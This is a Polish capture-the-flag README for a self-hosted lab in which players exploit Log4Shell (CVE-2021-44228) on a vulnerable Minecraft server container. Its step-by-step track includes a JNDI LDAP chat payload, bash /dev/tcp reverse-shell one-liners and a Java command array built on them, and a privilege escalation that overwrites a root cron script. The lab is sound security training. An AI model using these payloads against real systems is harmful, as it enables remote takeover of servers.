# minecraft-ctf

## Wprowadzenie
Witamy w `minecraft-ctf`, wyjątkowym wyzwaniu CTF stworzonym specjalnie dla Was! Twoim zadaniem będzie zdobycie flagi, wykorzystując podatność Log4j oraz kilka innych narzędzi, a to wszystko co najlepsze, z użyciem gry, którą chyba każdy zna! Przygotuj się na fascynujące wyzwanie! Owocnego hackowania i udanej zabawy!

## Zasady CTF

Uruchomiony kontener obrazu **kwasnyy/mcctf:mcexpl** jest atakowanym serwerem. Założenie jest, że nie masz do niego dostępu, nie masz o nim wiedzy (poza tym co piszemy tutaj). Więc zdobywanie wiedzy poprzez sprawdzanie `Dockerfile` albo włamywanie się poprzez `docker exec -it ID bash` jest bez sensu i nie jest rozwiązaniem CTF'a.
Pozostałe uruchamiane kontenery są już twoją własnością, możesz robić z nimi co chcesz.


## Wymagania
- Docker,
- Java (do uruchomienia clienta Minecrafta - jeśli jej nie masz, pobierz i zainstaluj),
- [Minecraft Launcher](/SKlauncher-Universal-All-Versions.jar) albo jakikolwiek inny launcher,
- NetCat (użyj WSL lub zainstaluj na Windowsie),

## HARD - Ogólny zarys postępowania
1. Uruchom server docker z serverem Minecraft:
   - `docker run -p 25565:25565 -it kwasnyy/mcctf:mcexpl`
2. Wykorzystaj podatność CVE-2021-44228 do uzyskania reverse shell
   - napoczęty `marshalsec/Dockerfile` może ci ułatwić,
   - tak samo masz `codehttp/` gdzie manipulować trzeba tylko linijką gdzie ustawia zmienną `cmd`,
3. Interesujący cię plik jest umieszczony gdzieś na systemie,
4. Rozejrzyj się po plikach w folderze `/server`,
5. Po odczytaniu tajnego kodu zapraszamy do wspólnej gry :)


## EASY - Krok po kroku

### 0. Uruchamianie SKLauncher
   1. Otwórz SKLauncher, który również znajduje się w repozytorium.
   2. Wybierz tryb offline.
   3. Kliknij '+' obok "Installations Manager".
   4. Wybierz release 1.8.8, zapisz i naciśnij PLAY.

### 1. Uruchomienie serwera Minecraft
   1. **Uruchom Minecraft'a:**
      - `docker run -p 25565:25565 -it kwasnyy/mcctf:mcexpl`
      - po zbudowaniu kontenera i uruchomieniu, w trybie Multiplayer w grze, dodaj serwer pod adresem 127.0.0.1.

### 2. Wykorzystaj podatnośc CVE-2021-44228 do uzyskania reverse shell


<details>
<summary><b>Informacje o kontenerach</b></summary>
Dwa spośród trzech odpalonych przez Ciebie kontenerów są "Twoje" - jako hacker je kontrolujesz. Nienależącym do Ciebie jest ten hostujący serwer Minecraft'a, do którego chcesz uzyskać dostęp. Pozostałe kontenery pomogą Ci w tej misji.
</details>

   1. **Uruchom serwer LDAP:**
      - `cd marshalsec`
      - znając schemat działania *JNDI* ustaw w Dockerfile adres IP i PORT gdzie będzie wystawiony kod do wykonania na serwerze Minecrafta,
      - `docker build . -t marshal`
      - `docker run -p 1389:1389 -ti marshal`

   2. **Przygotuj kod do połączenia się z reverse shell i wystaw go na serwerze http:**
      - przygotuj sobie `netcat` na hoście (swoim komputerze), może na wsl, a może zainstaluj na Windowsie,
      - potem uruchamiasz nasłuchiwanie komendą `nc -l [port]`,
      - cd `codehttp/`
      - ten kontener służy do serwowania statycznych plików po http,
      - edytuj linijkę w pliku `Log4jRCE.java`,
         1. nie uruchamiaj komendy bezpośrednio, lecz stwórz plik, a potem uruchom go bashem,
         2. dodaj " &" na końcu linijki w pliku gdzie uruchamiasz netcata, dzięki temu zostanie on uruchomiony w tle, a server Minecrafta nie scrashuje,
         3. podpowiedzi:
            1. `bash -c "..."`,
            2. `echo "komenda > plik.sh" ; bash plik.sh`,
            3. `nohup`,
            4. `bash -i >/dev/tcp/[ip hosta]/[port nasluchujacy] 2>&1 0<&1`,
            5. ` &`,
         4. 
            <details>
            <summary><b> Pokaż komendę:</b></summary>

            ```java
            String[] cmd = {"bash", "-c", "echo 'nohup bash -i >/dev/tcp/[ip hosta]/[port nasluchujacy] 2>&1 0<&1 &' > /server/script.sh; bash /server/script.sh"};
            ```

            </details>
      - podczas budowania obrazu zostanie ten plik do niego skopiowany, a następnie skompilowany,
      - a po uruchomieniu kontenera, będzie serwowany plik "Log4jRCE.class" na porcie *:8888* tego kontenera,
      - zbuduj obraz: `docker build . -t codehttp`,
      - uruchom kontener: `docker run -p 8888:8888 -ti codehttp`,
   3. **NA CZACIE W MINECRAFT WYŚLIJ:**
      `${jndi:ldap://ADRES_TWOJEGO_KOMPA:1389/Log4jRCE}`

### 3. Interesujący cię plik jest umieszczony gdzieś na systemie:
   wyszukaj plik komendą `find / -name "flag.txt"`,

### 4. Rozejrzyj się po plikach w folderze `/server`:
   1. interesuje cię plik `cronjob.sh`,
   2. zobacz na zawartość - wykonuje on backup świata minecrafta,
   3. `ls -la /server/bqp` - zobacz kto jest właścicielem folderów - ten sam user ma w swoim cronie zamontowane uruchamianie tego skryptu,
   4. podmień zawartość skryptu `cronjob.sh` na taką, która wykonana z uprawnieniami roota pozwoli na odczytanie pliku,
   5. <details>
      <summary><b>Pokaż komendę:</b></summary>
      `echo "chmod 666 /usr/lib/jvm/jre1.8.0_181/lib/desktop/icons/LowContrast/16x16/mimetypes/flag.txt" > /server/cronjob.sh`
      </details>

### 5. Po odczytaniu flagi zapraszamy do wspólnej gry :)
   0. postępuj zgodnie z instrukcjami klikając przyciski,
   1. wprowadź flagę do skrzynki,
   2. odczekaj chwilkę,
   3. Zapraszamy do wspólnej gry! <3


## Twoje zadanie
Wykorzystaj podatność starej wersji Log4j i inne narzędzia do zdobycia ukrytej flagi. Kod hostowany na httpcode musi być przygotowany i skompilowany. Znajdź i zmodyfikuj bashowy skrypt wykonywany z uprawnieniami roota. Jak uzyskasz uprawnienia roota, możesz odnaleźć w plikach kod, który następnie wpiszesz w serwerze Minecrafta. Jeśli kod okaże się poprawny - gratulacje hackerze/ko ;)

## Przydatne informacje

### Uzyskanie Reverse Shell
```sh
# Nasłuchuj na porcie `5000` na swoim komputerze:
nc -l 5000

# Na komputerze ofiary:
bash -i >& /dev/tcp/[ip kompa na którym jest `nc` włączony]/5000 0>&1

# przykład:
bash -i >& /dev/tcp/172.17.0.1/5000 0>&1
```

### Budowanie obrazu:
```sh
# Stworzenie obrazu kontenera:
docker build . -t <nazwa-obrazu>

# Uruchomienie obrazu z przekierowaniem portów:
docker run -p 25565:25565 -ti <nazwa-obrazu>
```


## Przydatne komendy 

### Docker
```sh
docker build . -t <jakas nazwa>
docker run -p <host>:<docker> -ti <jakas nazwa>
docker ps
docker ps -a
docker kill <id>     # nie trzeba wpisywać całego id, wystarczy jednoznacznie identyfikujący początek
docker remove <id>   # tu też, generalnie tak działa id
docker image prune   # wywal nieuruchomione image
docker container prune  # wywal zatrzymane kontenery (kontener po CTRL+C zostaje zatrzymany, a nie usunięty)
```

<br>

## Credits
- [Minecraft-Log4j-Exploit](https://github.com/Justin-Garey/Minecraft-Log4j-Exploit) od Justina Gareya
- [marshalsec](https://github.com/mbechler/marshalsec) od Marcina Bechlera
- [Smallest Docker Image Static Website](https://lipanski.com/posts/smallest-docker-image-static-website) od Vladimira Lipanskiego
- [Mapa Minecraft](https://www.minecraftxl.com/deep-sea-map/) od BlockWorks


